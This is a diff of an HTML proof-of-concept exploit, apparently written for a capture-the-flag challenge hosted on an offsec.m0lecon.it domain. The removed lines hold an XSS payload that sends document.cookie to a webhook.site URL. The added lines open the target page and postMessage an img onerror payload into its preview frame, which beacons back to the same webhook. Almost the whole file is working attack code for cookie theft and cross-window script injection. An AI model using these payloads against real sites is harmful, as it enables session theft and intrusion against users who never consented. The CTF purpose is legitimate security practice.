@@ -1,6 +1,27 @@
 <html>
-<script>
-  window.parent.postMessage("<img src=x onerror=fetch(\"https://webhook.site/1b8598c9-0eea-49cc-989f-aadf8862983d?c=\"+document.cookie) >", "*");
-</script>
-<button onclick="fetch(`https://webhook.site/1b8598c9-0eea-49cc-989f-aadf8862983d`)"></button>
+    <body>
+        <input type="button" value="Click Me" id="btn" />
+    </body>
+
+    <script>
+        document.getElementById("btn").onclick = function (e) {
+            fetch(
+                "https://webhook.site/1b8598c9-0eea-49cc-989f-aadf8862983d?c=CLICK",
+            );
+            window.poc = window.open(
+                "https://16825a25-b481-441a-9636-53c009947f74.offsec.m0lecon.it/",
+            );
+            setTimeout(function () {
+                var previewframe = window.poc.frames[0];
+                previewframe.postMessage(
+                    {
+                        html: "<img src=1 onerror=fetch(`https://webhook.site/1b8598c9-0eea-49cc-989f-aadf8862983d?c=HIT`)",
+                        subject: "Exploit",
+                    },
+                    "*",
+                );
+            }, 2000);
+        };
+    </script>
 </html>
+
